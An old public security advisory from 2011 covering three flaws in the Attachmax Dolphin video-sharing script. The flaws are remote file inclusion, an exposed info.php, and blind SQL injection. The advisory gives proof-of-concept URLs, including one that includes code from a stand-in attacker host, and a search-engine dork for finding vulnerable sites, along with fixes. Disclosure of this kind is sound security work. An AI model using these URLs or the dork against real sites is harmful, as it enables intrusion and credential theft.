Author : ph03nix
Date : january 2011
Location :  Indonesia
Web : http://www.pho3nix.co.tv
Critical Lvl : High
Impact : System access
Where : From Remote
---------------------------------------------------------------------------

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Application : Attachmax Dolphin
version : <= 2.1.0
Vendor : http://www.attachmax.com/
Description :

Attachmax allows you to run your very own youtube Video Community site, just 
like popular Videos sites
such as youtube, dailymotion and revver. Additionally Attachmax includes the 
ability for Images and Files,
following the trend of other popular File Sharing communities such as Imageshack 
and Rapidshare. 
So not only do you get a fully functional Video Script, but a complete File 
Sharing Website.

---------------------------------------------------------------------------

Vulnerability:
~~~~~~~~~~~~~~

1. Remote File Inclusion Vulnerability

Input passed to the "rel_path" parameter in config.php page is not properly 
verified before being used 
to include files.This can be exploited to include arbitrary files from local or 
external resources.
Successful exploitation requires that "register_globals" is enabled.


Poc/Exploit:
~~~~~~~~~~
http://www.example.com/[path]/config.php?rel_path=http://www.attacker.com/evil?


2. File info disclosure Vulnerability

File info.php in main folder not protected to see directly from browser and 
could allow an attacker 
to obtain sensitive information from the server.

Poc:
~~~~
http://www.example.com/[path]/info.php


3. Blind SQL Injection Vulnerability.

Input passed to the "category" parameter in search.php page is not properly 
verified before being used 
in an sql query.
This can be exploited thru the browser to manipulate SQL queries and pull the 
username and password
from users in plain text.

Poc/Exploit:
~~~~~~~~~~~~
http://www.example.com/[path]/index.php?page=Search&category=[BlindSQL]



Dork:
~~~~~
inurl:"controller.php?page=profile"


Solution:
~~~~~~~

- Edit the source code to ensure that input is properly verified.
- Turn off register_globals in php.ini
- Rename info.php.



      
